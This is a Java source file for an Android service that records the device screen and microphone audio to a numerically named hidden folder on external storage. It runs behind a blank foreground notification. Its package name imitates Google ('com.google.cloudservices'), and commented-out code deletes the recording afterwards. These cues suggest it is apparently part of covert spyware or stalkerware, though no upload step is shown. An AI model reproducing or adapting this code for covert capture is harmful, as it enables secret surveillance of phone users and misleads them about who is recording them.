package com.google.cloudservices;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.support.v4.app.NotificationCompat;
import android.util.Log;
import android.util.SparseIntArray;
import android.view.Surface;

import java.io.File;
import java.io.IOException;

public class Captureservice extends Service {
    private int mScreenDensity;
    private MediaProjectionManager mProjectionManager;
    int DISPLAY_WIDTH = 720;
    int DISPLAY_HEIGHT = 1280;
    MediaProjection mMediaProjection;
    VirtualDisplay mVirtualDisplay;


    MediaRecorder mMediaRecorder;
     SparseIntArray ORIENTATIONS = new SparseIntArray();
    {
        ORIENTATIONS.append(Surface.ROTATION_0, 90);
        ORIENTATIONS.append(Surface.ROTATION_90, 0);
        ORIENTATIONS.append(Surface.ROTATION_180, 270);
        ORIENTATIONS.append(Surface.ROTATION_270, 180);
    }
    String EXTRA_RESULT_CODE="resultCode";
    String EXTRA_RESULT_INTENT="resultIntent";
    int resultCode;
    Intent resultData;
    public Captureservice() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            createNotificationChannel();
            Notification notification = new NotificationCompat.Builder(getApplicationContext(), "ForegroundServiceChannel")
                    .build();
            startForeground(1, notification);


        }

        if (intent.getAction()==null) {
            resultCode=intent.getIntExtra(EXTRA_RESULT_CODE, 1337);
            resultData=intent.getParcelableExtra(EXTRA_RESULT_INTENT);
            mScreenDensity=intent.getIntExtra("density",1337);
        }
        mMediaRecorder = new MediaRecorder();
        mProjectionManager = (MediaProjectionManager) getSystemService
                (Context.MEDIA_PROJECTION_SERVICE);
        initRecorder();
        shareScreen();
        return super.onStartCommand(intent, flags, startId);
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    "ForegroundServiceChannel",
                    "Foreground Service Channel",
                    NotificationManager.IMPORTANCE_DEFAULT
            );
            NotificationManager manager = getSystemService(NotificationManager.class);

            manager.createNotificationChannel(serviceChannel);


        }
    }
    private void initRecorder() {
        try {
            mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mMediaRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
            mMediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            File file=new File(Environment.getExternalStorageDirectory().getAbsolutePath(),"468545878548");
            if (!file.exists()){file.mkdirs();}
//
            mMediaRecorder.setOutputFile(Environment.getExternalStorageDirectory().getAbsolutePath() + "/468545878548/a.mp4");
            mMediaRecorder.setVideoSize(DISPLAY_WIDTH, DISPLAY_HEIGHT);
            mMediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
            mMediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mMediaRecorder.setVideoEncodingBitRate(512 * 1000);
            mMediaRecorder.setVideoFrameRate(30);
            mMediaRecorder.prepare();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    private void shareScreen() {
//        mMediaProjectionCallback = new MediaProjectionCallback();
        mMediaProjection = mProjectionManager.getMediaProjection(resultCode,resultData);
        mVirtualDisplay = createVirtualDisplay();
        mMediaRecorder.start();
    }
    private VirtualDisplay createVirtualDisplay() {
        return mMediaProjection.createVirtualDisplay("Captureservice",
                DISPLAY_WIDTH, DISPLAY_HEIGHT, mScreenDensity,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                mMediaRecorder.getSurface(), null /*Callbacks*/, null
                /*Handler*/);
    }
    private void stopScreenSharing() {
        if (mVirtualDisplay == null) {
            return;
        }
        mVirtualDisplay.release();
        destroyMediaProjection();
    }
    @Override
    public void onDestroy() {
        super.onDestroy();
        mMediaRecorder.stop();
        mMediaRecorder.reset();
        stopScreenSharing();
//        Handler handler=new Handler();
//        handler.postDelayed(new Runnable() {
//            @Override
//            public void run() {
//                File file=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/a.mp4");
//                if (file.exists()){
//                    file.delete();
//                }
//
//            }
//        },3000);
        destroyMediaProjection();

    }
    private void destroyMediaProjection() {
        if (mMediaProjection != null) {
            Log.e("Exsdsd", "destroyMediaProjection: " );
            mMediaProjection.stop();
            mMediaProjection = null;
//            Handler handler=new Handler();
//        handler.postDelayed(new Runnable() {
//            @Override
//            public void run() {
//                File file=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/a.mp4");
//                if (file.exists()){
//                    file.delete();
//                }
//
//            }
//        },3000);
            Runtime.getRuntime().gc();
        }
    }


}
